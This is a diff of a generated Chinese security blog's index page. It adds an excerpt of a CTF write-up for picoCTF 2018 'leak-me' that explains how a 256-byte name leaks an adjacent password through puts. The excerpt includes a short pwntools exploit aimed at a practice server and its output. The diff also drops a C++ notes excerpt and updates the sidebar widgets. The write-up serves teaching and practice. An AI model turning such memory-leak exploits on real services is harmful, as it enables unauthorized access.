@@ -141,6 +141,68 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/05/01/picoctf-2018-leak-me详解/" >picoctf_2018_leak_me详解</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-05-01  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>虽然很简单，<del>但好像第一次碰见这样的题</del>，所以记录下。</p>
+</blockquote>
+<h3 id="反汇编问题"><a href="#反汇编问题" class="headerlink" title="反汇编问题"></a>反汇编问题</h3><p>问题：main函数f5的时候报如下错误</p>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234336628.png" alt="image-20210501234336628"></p>
+<p>解决：</p>
+<ol>
+<li><p>找到报错的地址：0x8048705【按g输入地址即可】</p>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234523311.png" alt="image-20210501234523311"></p>
+</li>
+<li><p>双击函数，然后f5</p>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234614572.png" alt="image-20210501234614572"></p>
+</li>
+<li><p>然后就可以正常了</p>
+</li>
+</ol>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
+<li>输入name</li>
+<li>打印name</li>
+<li>输入password</li>
+<li>比较输入password和password</li>
+<li>相同打印flag</li>
+</ol>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234815805.png" alt="image-20210501234815805"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于name和password是紧挨着的，而且差距0x100。</p>
+<p>如果name的长度为0x100，那么puts输出name的时候，就会把password一起带出来了。</p>
+<p>而且name的最大长度可以达到0x100，故首先令name=0x100，即可泄露password，接着就可以得到flag了。</p>
+<p><img src="/2021/05/01/picoctf-2018-leak-me%E8%AF%A6%E8%A7%A3/image-20210501234915134.png" alt="image-20210501234915134"></p>
+<h4 id="获得password"><a href="#获得password" class="headerlink" title="获得password"></a>获得password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26105)</span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">p.sendline(&quot;a&quot;*0x100)</span><br><span class="line"># password &#x3D; &quot;a_reAllY_s3cuRe_p4s$word_f85406&quot;</span><br><span class="line"># p.sendline(password)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406</span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26105</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># password = "a_reAllY_s3cuRe_p4s$word_f85406"</span></span><br><span class="line"><span class="comment"># p.sendline(password)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="PicoCTF_2018_leak-me">附件</a></p>
+
+	
+	</div>
+  <a type="button" href="/2021/05/01/picoctf-2018-leak-me详解/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/05/01/gyctf-2020-some-thing-exceting详解/" >gyctf_2020_some_thing_exceting详解</a>
 		</h3>
 		</div>
@@ -1192,58 +1254,6 @@ var _hmt = _hmt || [];
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/04/18/算法之数据结构篇/" >算法之数据结构篇</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-04-18  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>###　插入</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push_back();</span><br></pre></td></tr></table></figure>
-
-<h2 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h2><blockquote>
-<p>内部采用的是hash表结构,拥有快速检索的功能。 </p>
-</blockquote>
-<h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers) ++<span class="built_in">map</span>[k];</span><br></pre></td></tr></table></figure>
-
-<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><blockquote>
-<p>sort两个参数，分别是数组的起始位置和终止位置。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(begin, end)</span><br></pre></td></tr></table></figure>
-
-<h2 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h2><blockquote>
-<p>其中：前面的需要指定类型，：后面的直接填就行，这里是vector类型的数据</p>
-<p>这里val是numbers变量里面的值。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for(const int val:numbers)</span><br><span class="line">	++mp[val];</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-	
-	</div>
-  <a type="button" href="/2021/04/18/算法之数据结构篇/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1313,7 +1323,7 @@ var _hmt = _hmt || [];
 		
 			<li><a href="/categories/基础知识/">基础知识<span>1</span></a></li>
 		
-			<li><a href="/categories/复现/">复现<span>1</span></a></li>
+			<li><a href="/categories/复现/">复现<span>2</span></a></li>
 		
 			<li><a href="/categories/工具/">工具<span>1</span></a></li>
 		
@@ -1330,48 +1340,48 @@ var _hmt = _hmt || [];
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/dasctf/">dasctf<span>1</span></a></li>
+			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
 		
-			<li><a href="/tags/unsortedbin-attack/">unsortedbin attack<span>1</span></a></li>
-		
-			<li><a href="/tags/leetcode/">leetcode<span>1</span></a></li>
+			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
 		
 			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
 		
-			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
+			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
 		
-			<li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
+			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
 		
-			<li><a href="/tags/安装/">安装<span>1</span></a></li>
+			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
 		
 			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
 		
+			<li><a href="/tags/安装/">安装<span>1</span></a></li>
+		
+			<li><a href="/tags/v8/">v8<span>1</span></a></li>
+		
+			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
+		
 			<li><a href="/tags/c-基础/">c++基础<span>1</span></a></li>
 		
-			<li><a href="/tags/flair/">flair<span>1</span></a></li>
+			<li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
 		
-			<li><a href="/tags/基础练习/">基础练习<span>1</span></a></li>
+			<li><a href="/tags/unlink/">unlink<span>2</span></a></li>
+		
+			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
+		
+			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
 		
 			<li><a href="/tags/srop/">srop<span>1</span></a></li>
 		
 			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
 		
-			<li><a href="/tags/double-free/">double free<span>1</span></a></li>
+			<li><a href="/tags/unsortedbin-attack/">unsortedbin attack<span>1</span></a></li>
 		
-			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
+			<li><a href="/tags/off-by-one/">off by one<span>1</span></a></li>
 		
-			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
-		
-			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
-		
-			<li><a href="/tags/v8/">v8<span>1</span></a></li>
-		
-			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
+			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>32</span></a></li>
+		   <li><a href="/tags">...<span>33</span></a></li>
 		 
 		</ul>
 	</div>
@@ -1382,6 +1392,10 @@ var _hmt = _hmt || [];
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/06/09/2021-ciscn-pwn初赛/" ><i class="fa fa-file-o"></i>2021_ciscn_pwn初赛</a>
+      </li>
     
       <li>
         <a href="/2021/06/06/os真象还原/" ><i class="fa fa-file-o"></i>os真象还原-笔记</a>
@@ -1397,10 +1411,6 @@ var _hmt = _hmt || [];
     
       <li>
         <a href="/2021/05/13/pwn题模板/" ><i class="fa fa-file-o"></i>pwn wp模板</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/13/unsortedbin-attack/" ><i class="fa fa-file-o"></i>unsortedbin attack</a>
       </li>
     
   </ul>
